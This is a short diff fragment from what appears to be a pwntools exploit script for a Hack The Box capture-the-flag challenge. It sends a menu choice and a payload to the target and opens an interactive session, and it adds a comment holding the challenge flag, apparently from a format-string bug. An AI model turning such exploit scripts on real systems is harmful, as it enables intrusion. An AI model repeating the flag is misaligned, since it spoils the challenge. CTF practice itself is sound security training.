@@ -90,4 +90,4 @@ io.sendline(b'2')
 io.recvuntil('You have less than 20 space rocks! Are you sure you want to buy it?')
 io.sendline(payload)
 io.interactive()
-
+#HTB{th3_f_s4ys_f0rm4t_str1ng!!}
